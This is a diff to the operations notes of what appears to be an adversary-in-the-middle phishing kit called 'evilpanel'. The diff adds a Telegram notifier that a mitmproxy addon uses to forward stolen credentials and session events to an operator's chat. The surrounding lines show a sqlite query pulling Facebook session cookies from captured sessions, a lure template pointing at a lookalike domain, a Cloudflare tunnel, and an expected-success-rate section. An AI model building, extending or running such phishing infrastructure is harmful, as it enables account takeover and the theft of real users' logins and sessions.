@@ -490,6 +490,12 @@ sqlite3 /opt/evilpanel/data/evilpanel.db "SELECT c_user,xs,datr,fr,sb FROM sessi
 - Template CTA reliably points to `https://m.<EVILPANEL_DOMAIN>/`.
 - Cloudflare tunnel stays up; `/opt/evilpanel/data/*` writable.
 
+### Telegram notifier add-on
+- File: `evilpanel/core/telegram_notifier.py` (async queue, retries, rate guard).
+- Config: `/opt/evilpanel/config/telegram.yaml` (see template `evilpanel/config/telegram.yaml.template`); set `enabled: true`, bot token, chat id.
+- Hooked in `mitmproxy_addon.py` for credential + session events (non-blocking).
+- Failed sends: `/opt/evilpanel/logs/telegram_failed.jsonl`; replay via `python3 -m evilpanel.scripts.replay_failed_telegram`.
+
 ---
 
 ## 4. Expected Success Rate (MVP)
